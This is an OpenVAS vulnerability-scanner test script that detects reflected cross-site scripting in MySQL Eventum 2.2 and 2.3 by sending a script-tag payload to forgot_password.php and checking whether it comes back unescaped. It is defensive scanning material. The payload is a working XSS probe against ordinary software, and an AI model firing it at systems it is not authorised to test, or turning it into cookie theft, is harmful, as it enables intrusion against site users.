###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_mysql_eventum_mult_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Oracle MySQL Eventum Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary script
  code in the browser of an unsuspecting user in the context of the affected
  site. This may let the attacker steal cookie-based authentication credentials
  and launch other attacks.
  Impact Level: Application";
tag_affected = "MySQL Eventum version 2.2 and 2.3";
tag_insight = "Multiple flaws are due to an error in '/htdocs/list.php',
  '/htdocs/forgot_password.php' and '/htdocs/select_project.php', which is not
  properly validating the input passed to the 'keywords' parameter.";
tag_solution = "No solution or patch is available as of 15th February, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://forge.mysql.com/wiki/Eventum";
tag_summary = "This host is running Oracle MySQL Eventum and is prone to multiple
  cross site scripting vulnerabilities.";

if(description)
{
  script_id(801593);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Oracle MySQL Eventum Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/98423/ZSL-2011-4989.txt");

  script_description(desc);
  script_summary("Check for cross site scripting vulnerability in MySQL Eventum ");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir (make_list("/eventum", "/Eventum", "/", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir,"/htdocs/index.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  
  ## Confirm the application
  if(">Login - Eventum<" >< res)
  {

    ## Construct the request
    req = http_get(item:string(dir,'/htdocs/forgot_password.php/"><script>' +
                  'alert("XSS-ATTACK_TEST")</script>'), port:port);

    ## Send and Receive the response
    res = http_keepalive_send_recv(port:port, data:req);

    ##  Confirm the exploit
    if('<script>alert("XSS-ATTACK_TEST")</script>' >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
